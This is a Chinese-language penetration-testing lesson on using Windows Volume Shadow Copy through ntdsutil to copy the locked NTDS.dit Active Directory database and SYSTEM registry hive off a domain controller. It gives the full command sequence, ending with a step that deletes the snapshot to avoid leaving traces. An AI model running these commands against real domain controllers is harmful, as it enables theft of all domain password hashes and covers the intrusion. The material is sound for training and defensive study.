# 网络安全入门：P64：1、Volume Shadow Copy 技术详解 🛡️

在本节课中，我们将学习在Windows域环境下获取用户凭据信息的一种关键技术——Volume Shadow Copy。我们将重点了解其原理，并通过详细的命令行操作演示如何利用该技术提取受系统保护的关键文件。

## 概述

在Windows域环境中，所有域用户、组及其密码哈希值都存储在一个名为`NTDS.dit`的活动目录数据库文件中。由于Windows系统的保护机制，该文件在系统运行时被锁定，无法直接读取或复制。因此，我们需要使用特殊技术来获取其副本。本节将介绍利用Windows系统自带的卷影复制服务来实现这一目标的方法。

![](img/22c5f08d6565802370c26b6d3fcb2ad0_1.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_2.png)

## 核心概念与目标文件

上一节我们介绍了域环境的基本概念，本节中我们来看看获取凭据所需的关键文件。

![](img/22c5f08d6565802370c26b6d3fcb2ad0_4.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_5.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_6.png)

在域控制器上，核心凭据信息存储在以下位置：
*   **活动目录数据库文件**：`C:\Windows\NTDS\NTDS.dit`
*   **系统注册表文件**：`C:\Windows\System32\config\SYSTEM`

![](img/22c5f08d6565802370c26b6d3fcb2ad0_8.png)

为了解密`NTDS.dit`文件中的哈希值，通常需要同时获取`SYSTEM`文件。然而，直接访问这些文件会受到系统阻止。

## Volume Shadow Copy 技术原理

![](img/22c5f08d6565802370c26b6d3fcb2ad0_10.png)

为了解决文件被锁定的问题，我们引入Volume Shadow Copy服务。该服务是Windows系统提供的一种用于创建**卷影副本**（即快照）的机制。

![](img/22c5f08d6565802370c26b6d3fcb2ad0_12.png)

以下是该技术的关键点：
*   **功能**：创建驱动器在某个时间点的只读副本。
*   **用途**：常用于数据备份与恢复。
*   **兼容性**：支持Windows Server 2003及更高版本的系统。
*   **优势**：可以在不中断系统服务的情况下，复制被锁定的系统文件。

## 操作步骤演示

![](img/22c5f08d6565802370c26b6d3fcb2ad0_14.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_15.png)

我们将使用Windows系统自带的`ntdsutil`命令行工具来操作卷影复制服务。以下是完整的操作流程。

![](img/22c5f08d6565802370c26b6d3fcb2ad0_17.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_19.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_20.png)

### 步骤一：创建卷影副本

![](img/22c5f08d6565802370c26b6d3fcb2ad0_22.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_24.png)

首先，我们需要为系统盘（通常是C盘）创建一个卷影副本（快照）。

![](img/22c5f08d6565802370c26b6d3fcb2ad0_26.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_28.png)

1.  以管理员身份打开命令提示符。
2.  输入以下命令进入`ntdsutil`工具：
    ```cmd
    ntdsutil
    ```
3.  在`ntdsutil`提示符下，激活快照上下文：
    ```cmd
    snapshot
    ```
4.  创建新的快照：
    ```cmd
    activate instance ntds
    create
    ```
    执行成功后，命令行会返回新创建快照的ID（例如：`{GUID}`）。

![](img/22c5f08d6565802370c26b6d3fcb2ad0_29.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_30.png)

### 步骤二：挂载卷影副本

![](img/22c5f08d6565802370c26b6d3fcb2ad0_32.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_33.png)

创建快照后，需要将其挂载到一个可访问的驱动器路径。

![](img/22c5f08d6565802370c26b6d3fcb2ad0_35.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_36.png)

1.  在`ntdsutil`的快照上下文中，列出所有快照以确认ID：
    ```cmd
    list all
    ```
2.  挂载指定ID的快照（请将`{GUID}`替换为实际的快照ID）：
    ```cmd
    mount {GUID}
    ```
    挂载成功后，系统会提示快照已挂载到类似`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX`的路径。

![](img/22c5f08d6565802370c26b6d3fcb2ad0_38.png)

### 步骤三：复制目标文件

![](img/22c5f08d6565802370c26b6d3fcb2ad0_40.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_42.png)

快照挂载后，其中的文件便不再被系统进程锁定，可以自由复制。

![](img/22c5f08d6565802370c26b6d3fcb2ad0_44.png)

1.  打开一个新的命令提示符窗口。
2.  使用`copy`命令从快照路径复制`NTDS.dit`文件到当前目录（请将`X`替换为实际的卷影副本编号）：
    ```cmd
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit C:\NTDS.dit
    ```
3.  同样地，复制`SYSTEM`文件：
    ```cmd
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SYSTEM C:\SYSTEM.hive
    ```
    至此，我们已成功获取到所需的两个关键文件。

![](img/22c5f08d6565802370c26b6d3fcb2ad0_46.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_47.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_49.png)

### 步骤四：清理痕迹

![](img/22c5f08d6565802370c26b6d3fcb2ad0_51.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_53.png)

操作完成后，为了保持系统整洁并避免留下明显的快照痕迹，需要进行清理。

![](img/22c5f08d6565802370c26b6d3fcb2ad0_55.png)

1.  回到最初的`ntdsutil`命令窗口。
2.  卸载已挂载的快照：
    ```cmd
    unmount {GUID}
    ```
3.  删除创建的快照：
    ```cmd
    delete {GUID}
    ```
4.  退出`ntdsutil`工具：
    ```cmd
    quit
    quit
    ```

![](img/22c5f08d6565802370c26b6d3fcb2ad0_57.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_58.png)

## 总结

![](img/22c5f08d6565802370c26b6d3fcb2ad0_59.png)

![](img/22c5f08d6565802370c26b6d3fcb2ad0_61.png)

本节课中我们一起学习了Volume Shadow Copy技术的原理与应用。通过利用Windows系统自带的卷影复制服务，我们能够绕过系统对`NTDS.dit`等关键文件的锁定，成功创建其副本，为后续的凭据提取与哈希破解打下基础。掌握这一技术是域渗透测试中的重要环节。在后续课程中，我们将学习如何利用获取到的文件提取哈希并进行破解。